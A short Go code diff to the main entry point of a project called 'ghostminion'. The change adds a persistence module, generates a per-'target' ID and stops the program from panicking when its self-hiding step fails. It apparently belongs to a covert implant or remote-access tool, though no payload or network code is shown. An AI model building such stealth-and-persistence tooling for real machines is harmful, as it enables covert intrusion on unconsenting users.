@@ -1,17 +1,19 @@
 package main
 
 import (
+	"fmt"
 	"ghostminion/apps"
 	"ghostminion/config"
 	"ghostminion/db"
 	"ghostminion/hider"
+	"ghostminion/persistence"
 	"log"
 	"sync"
 )
 
 func main() {
 	var wg sync.WaitGroup
-	wg.Add(1) // for run app
+	wg.Add(1) // for "run" function
 
 	configInstance, err := config.LoadConfig("../config.yaml") //get from configPath
 	if err != nil {
@@ -20,13 +22,16 @@ func main() {
 
 	err = hider.Hide()
 	if err != nil {
-		panic(err)
+		//panic(err)
 	}
 
 	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
 	if err != nil {
 		panic(err)
 	}
+
+	targetId := persistence.GenerateTargetID()
+	fmt.Println("targetId:", targetId)
 
 	appManager := apps.NewAppManager()
 	addBuiltinApps(appManager)
